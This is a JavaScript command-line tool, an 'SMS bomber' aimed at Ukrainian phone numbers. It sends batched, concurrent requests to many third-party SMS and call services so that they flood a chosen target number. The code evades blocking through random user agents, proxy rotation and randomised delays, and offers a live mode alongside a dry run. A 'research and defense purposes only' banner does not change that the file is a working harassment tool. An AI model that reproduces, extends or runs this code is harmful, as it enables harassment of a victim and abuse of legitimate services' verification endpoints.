import axios from 'axios';
import chalk from 'chalk';
import cliProgress from 'cli-progress';
import { Command } from 'commander';
import { HttpsProxyAgent } from 'https-proxy-agent';
import UserAgent from 'user-agents';
import { services, categories, getServicesByCategory, getUkrainianServices } from './services.js';

const program = new Command();

const userAgentGenerator = new UserAgent({ deviceCategory: 'desktop' });

const formatPhone = (phone, format = 'international') => {
  let cleaned = phone.replace(/\D/g, '');
  if (cleaned.startsWith('0')) {
    cleaned = '380' + cleaned.slice(1);
  }
  if (!cleaned.startsWith('380')) {
    cleaned = '380' + cleaned;
  }
  switch (format) {
    case 'international': return '+' + cleaned;
    case 'local': return '0' + cleaned.slice(3);
    case 'raw': return cleaned;
    default: return '+' + cleaned;
  }
};

const replacePhone = (obj, phone) => {
  if (typeof obj === 'string') {
    return obj.replace(/{phone}/g, phone);
  }
  if (Array.isArray(obj)) {
    return obj.map(item => replacePhone(item, phone));
  }
  if (typeof obj === 'object' && obj !== null) {
    const result = {};
    for (const [key, value] of Object.entries(obj)) {
      result[key] = replacePhone(value, phone);
    }
    return result;
  }
  return obj;
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const randomDelay = (min = 100, max = 500) => {
  return Math.floor(Math.random() * (max - min + 1)) + min;
};

class SmsBomberTester {
  constructor(options = {}) {
    this.phone = options.phone;
    this.dryRun = options.dryRun || false;
    this.threads = options.threads || 1;
    this.delay = options.delay || 500;
    this.timeout = options.timeout || 10000;
    this.proxies = options.proxies || [];
    this.verbose = options.verbose || false;
    this.categories = options.categories || [];
    this.results = {
      total: 0,
      success: 0,
      failed: 0,
      errors: [],
      responses: []
    };
  }

  getRandomProxy() {
    if (this.proxies.length === 0) return null;
    return this.proxies[Math.floor(Math.random() * this.proxies.length)];
  }

  getRandomUserAgent() {
    return userAgentGenerator.random().toString();
  }

  async testService(service, phone) {
    const formattedPhone = formatPhone(phone, 'international');
    const data = replacePhone(service.data, formattedPhone);
    const url = replacePhone(service.url, formattedPhone);

    const config = {
      method: service.method.toLowerCase(),
      url: url,
      headers: {
        ...service.headers,
        'User-Agent': this.getRandomUserAgent(),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
      },
      timeout: this.timeout,
      validateStatus: () => true
    };

    if (service.formEncoded) {
      config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      config.data = new URLSearchParams(data).toString();
    } else if (service.method.toUpperCase() === 'POST') {
      config.data = data;
    } else if (service.method.toUpperCase() === 'GET') {
      config.params = data;
    }

    const proxy = this.getRandomProxy();
    if (proxy) {
      config.httpsAgent = new HttpsProxyAgent(proxy);
    }

    if (this.dryRun) {
      return {
        service: service.name,
        category: service.category,
        status: 'dry-run',
        request: { url, method: service.method, data }
      };
    }

    try {
      const startTime = Date.now();
      const response = await axios(config);
      const duration = Date.now() - startTime;

      const success = response.status >= 200 && response.status < 300;

      return {
        service: service.name,
        category: service.category,
        status: success ? 'success' : 'failed',
        statusCode: response.status,
        duration: duration,
        response: this.verbose ? response.data : undefined
      };
    } catch (error) {
      return {
        service: service.name,
        category: service.category,
        status: 'error',
        error: error.message
      };
    }
  }

  async run() {
    console.log(chalk.cyan('\n╔════════════════════════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║') + chalk.yellow.bold('        SMS BOMBER TESTER FOR UKRAINE (+380)                   ') + chalk.cyan('║'));
    console.log(chalk.cyan('║') + chalk.gray('        For research and defense purposes only                  ') + chalk.cyan('║'));
    console.log(chalk.cyan('╚════════════════════════════════════════════════════════════════╝\n'));

    let targetServices = getUkrainianServices();
    
    if (this.categories.length > 0) {
      targetServices = targetServices.filter(s => this.categories.includes(s.category));
    }

    console.log(chalk.white('Target phone: ') + chalk.green(formatPhone(this.phone)));
    console.log(chalk.white('Services to test: ') + chalk.green(targetServices.length));
    console.log(chalk.white('Mode: ') + chalk.green(this.dryRun ? 'DRY RUN (no actual requests)' : 'LIVE'));
    console.log(chalk.white('Threads: ') + chalk.green(this.threads));
    console.log(chalk.white('Delay: ') + chalk.green(this.delay + 'ms'));
    if (this.proxies.length > 0) {
      console.log(chalk.white('Proxies: ') + chalk.green(this.proxies.length));
    }
    console.log('');

    const progressBar = new cliProgress.SingleBar({
      format: chalk.cyan('{bar}') + ' | {percentage}% | {value}/{total} | {service}',
      barCompleteChar: '█',
      barIncompleteChar: '░',
      hideCursor: true
    });

    progressBar.start(targetServices.length, 0, { service: 'Starting...' });

    const results = [];

    for (let i = 0; i < targetServices.length; i += this.threads) {
      const batch = targetServices.slice(i, i + this.threads);
      const batchPromises = batch.map(service => this.testService(service, this.phone));
      
      const batchResults = await Promise.all(batchPromises);
      results.push(...batchResults);

      for (const result of batchResults) {
        this.results.total++;
        if (result.status === 'success' || result.status === 'dry-run') {
          this.results.success++;
        } else {
          this.results.failed++;
          if (result.error) {
            this.results.errors.push({ service: result.service, error: result.error });
          }
        }
        this.results.responses.push(result);
      }

      progressBar.update(Math.min(i + this.threads, targetServices.length), { 
        service: batch[batch.length - 1].name 
      });

      if (i + this.threads < targetServices.length) {
        await sleep(this.delay + randomDelay(0, 200));
      }
    }

    progressBar.stop();
    console.log('');

    this.printResults();
    
    return this.results;
  }

  printResults() {
    console.log(chalk.cyan('\n╔════════════════════════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║') + chalk.yellow.bold('                         RESULTS                                ') + chalk.cyan('║'));
    console.log(chalk.cyan('╚════════════════════════════════════════════════════════════════╝\n'));

    console.log(chalk.white('Total requests: ') + chalk.cyan(this.results.total));
    console.log(chalk.white('Successful: ') + chalk.green(this.results.success));
    console.log(chalk.white('Failed: ') + chalk.red(this.results.failed));

    const byCategory = {};
    for (const result of this.results.responses) {
      if (!byCategory[result.category]) {
        byCategory[result.category] = { success: 0, failed: 0, error: 0 };
      }
      if (result.status === 'success' || result.status === 'dry-run') {
        byCategory[result.category].success++;
      } else if (result.status === 'error') {
        byCategory[result.category].error++;
      } else {
        byCategory[result.category].failed++;
      }
    }

    console.log(chalk.cyan('\n─── By Category ───────────────────────────────────────────────'));
    for (const [cat, stats] of Object.entries(byCategory)) {
      const categoryName = categories[cat] || cat;
      const total = stats.success + stats.failed + stats.error;
      console.log(
        chalk.white(`${categoryName}: `) +
        chalk.green(`${stats.success}✓ `) +
        chalk.red(`${stats.failed}✗ `) +
        chalk.yellow(`${stats.error}⚠`) +
        chalk.gray(` (${total} total)`)
      );
    }

    if (this.verbose && this.results.responses.length > 0) {
      console.log(chalk.cyan('\n─── Detailed Results ──────────────────────────────────────────'));
      for (const result of this.results.responses) {
        const statusColor = result.status === 'success' ? chalk.green :
                          result.status === 'dry-run' ? chalk.blue :
                          result.status === 'error' ? chalk.yellow : chalk.red;
        
        let line = `${statusColor('●')} ${chalk.white(result.service.padEnd(20))} `;
        line += `${statusColor(result.status.padEnd(10))} `;
        
        if (result.statusCode) {
          line += chalk.gray(`[${result.statusCode}] `);
        }
        if (result.duration) {
          line += chalk.gray(`${result.duration}ms `);
        }
        if (result.error) {
          line += chalk.yellow(result.error.substring(0, 40));
        }
        
        console.log(line);
      }
    }

    if (this.results.errors.length > 0 && !this.verbose) {
      console.log(chalk.cyan('\n─── Errors ────────────────────────────────────────────────────'));
      for (const err of this.results.errors.slice(0, 10)) {
        console.log(chalk.yellow(`• ${err.service}: `) + chalk.gray(err.error.substring(0, 60)));
      }
      if (this.results.errors.length > 10) {
        console.log(chalk.gray(`... and ${this.results.errors.length - 10} more errors`));
      }
    }

    console.log('');
  }
}

async function exportResults(results, format, filename) {
  const fs = await import('fs');
  
  let content;
  if (format === 'json') {
    content = JSON.stringify(results, null, 2);
  } else if (format === 'csv') {
    const headers = 'service,category,status,statusCode,duration,error\n';
    const rows = results.responses.map(r => 
      `"${r.service}","${r.category}","${r.status}","${r.statusCode || ''}","${r.duration || ''}","${r.error || ''}"`
    ).join('\n');
    content = headers + rows;
  }

  fs.writeFileSync(filename, content);
  console.log(chalk.green(`Results exported to ${filename}`));
}

program
  .name('sms-bomber-tester')
  .description('SMS/Call bomber testing tool for Ukrainian numbers')
  .version('1.0.0');

program
  .command('test')
  .description('Test SMS services for a phone number')
  .requiredOption('-p, --phone <number>', 'Target phone number (Ukrainian +380)')
  .option('-d, --dry-run', 'Simulate requests without sending', false)
  .option('-t, --threads <number>', 'Number of concurrent requests', '1')
  .option('--delay <ms>', 'Delay between batches in ms', '500')
  .option('--timeout <ms>', 'Request timeout in ms', '10000')
  .option('-c, --categories <list>', 'Filter by categories (comma-separated)')
  .option('--proxy <url>', 'Proxy URL (can be specified multiple times)', (v, a) => a.concat(v), [])
  .option('--proxy-file <file>', 'File with proxy list (one per line)')
  .option('-v, --verbose', 'Show detailed output', false)
  .option('-o, --output <file>', 'Export results to file')
  .option('-f, --format <type>', 'Output format (json, csv)', 'json')
  .action(async (options) => {
    let proxies = options.proxy || [];
    
    if (options.proxyFile) {
      const fs = await import('fs');
      const content = fs.readFileSync(options.proxyFile, 'utf-8');
      proxies = proxies.concat(content.split('\n').filter(l => l.trim()));
    }

    const tester = new SmsBomberTester({
      phone: options.phone,
      dryRun: options.dryRun,
      threads: parseInt(options.threads),
      delay: parseInt(options.delay),
      timeout: parseInt(options.timeout),
      proxies: proxies,
      verbose: options.verbose,
      categories: options.categories ? options.categories.split(',') : []
    });

    const results = await tester.run();

    if (options.output) {
      await exportResults(results, options.format, options.output);
    }
  });

program
  .command('list')
  .description('List all available services')
  .option('-c, --category <name>', 'Filter by category')
  .action((options) => {
    console.log(chalk.cyan('\n╔════════════════════════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║') + chalk.yellow.bold('             AVAILABLE SERVICES FOR UKRAINE                     ') + chalk.cyan('║'));
    console.log(chalk.cyan('╚════════════════════════════════════════════════════════════════╝\n'));

    let targetServices = getUkrainianServices();
    
    if (options.category) {
      targetServices = targetServices.filter(s => s.category === options.category);
    }

    const grouped = {};
    for (const service of targetServices) {
      if (!grouped[service.category]) {
        grouped[service.category] = [];
      }
      grouped[service.category].push(service);
    }

    for (const [cat, svcs] of Object.entries(grouped)) {
      console.log(chalk.cyan(`\n─── ${categories[cat] || cat} (${svcs.length}) ───`));
      for (const svc of svcs) {
        console.log(chalk.white(`  • ${svc.name.padEnd(20)}`) + chalk.gray(svc.url.substring(0, 50)));
      }
    }

    console.log(chalk.cyan('\n─────────────────────────────────────────────────────────────────'));
    console.log(chalk.white(`Total: ${targetServices.length} services`));
    console.log('');
  });

program
  .command('categories')
  .description('List all categories')
  .action(() => {
    console.log(chalk.cyan('\n╔════════════════════════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║') + chalk.yellow.bold('                    CATEGORIES                                  ') + chalk.cyan('║'));
    console.log(chalk.cyan('╚════════════════════════════════════════════════════════════════╝\n'));

    for (const [key, name] of Object.entries(categories)) {
      const count = services.filter(s => s.category === key).length;
      console.log(chalk.white(`  ${key.padEnd(15)}`) + chalk.cyan(name.padEnd(25)) + chalk.gray(`(${count} services)`));
    }
    console.log('');
  });

program
  .command('stats')
  .description('Show statistics about services')
  .action(() => {
    const uaServices = getUkrainianServices();
    const intlServices = services.filter(s => s.country === 'INTL');

    console.log(chalk.cyan('\n╔════════════════════════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║') + chalk.yellow.bold('                    STATISTICS                                  ') + chalk.cyan('║'));
    console.log(chalk.cyan('╚════════════════════════════════════════════════════════════════╝\n'));

    console.log(chalk.white('Total services: ') + chalk.green(services.length));
    console.log(chalk.white('Ukrainian services: ') + chalk.green(uaServices.length));
    console.log(chalk.white('International services: ') + chalk.green(intlServices.length));
    console.log(chalk.white('Categories: ') + chalk.green(Object.keys(categories).length));

    console.log(chalk.cyan('\n─── By Category ───────────────────────────────────────────────'));
    const catStats = {};
    for (const s of services) {
      catStats[s.category] = (catStats[s.category] || 0) + 1;
    }
    
    const sorted = Object.entries(catStats).sort((a, b) => b[1] - a[1]);
    for (const [cat, count] of sorted) {
      const bar = '█'.repeat(Math.ceil(count / 2));
      console.log(chalk.white(`${(categories[cat] || cat).padEnd(25)}`) + chalk.cyan(bar) + chalk.gray(` ${count}`));
    }

    console.log(chalk.cyan('\n─── By HTTP Method ────────────────────────────────────────────'));
    const methodStats = {};
    for (const s of services) {
      methodStats[s.method] = (methodStats[s.method] || 0) + 1;
    }
    for (const [method, count] of Object.entries(methodStats)) {
      console.log(chalk.white(`${method.padEnd(10)}`) + chalk.green(count));
    }
    console.log('');
  });

program.parse();
